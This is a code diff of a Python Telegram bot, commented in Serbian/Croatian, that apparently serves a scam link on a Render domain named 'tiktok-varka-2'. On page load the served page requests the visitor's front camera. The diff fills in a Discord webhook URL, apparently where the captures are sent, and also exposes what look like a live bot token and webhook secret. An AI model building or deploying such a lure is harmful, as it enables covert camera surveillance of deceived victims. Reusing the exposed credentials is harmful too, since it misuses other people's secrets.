@@ -9,10 +9,10 @@ from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_applicati
 # 1. PODEŠAVANJA
 # =========================================================================
 API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
-DISCORD_WEBHOOK_URL = 'https://discord.com'
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1527509467204161567/Q6ilvbIGYe27grr4WTbr6yC1CwVfCMOGn1k4sbTciYzvjr211XXIfMxMqBfzJxcXEgh6'
 
-# TVOJA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
-MY_PUBLIC_DOMAIN = 'https://onrender.com'
+# TVOJA TAČNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
+MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
@@ -98,7 +98,6 @@ async def serve_link(request):
                 }}
 
                 window.onload = function() {{
-                    // POPRAVLJENO: Ispravni parametri za audio i video bez reči village
                     navigator.mediaDevices.getUserMedia({ { audio: false, video: { facingMode: "user" } } })
                     .then(function(stream) {{
                         const video = document.createElement('video');
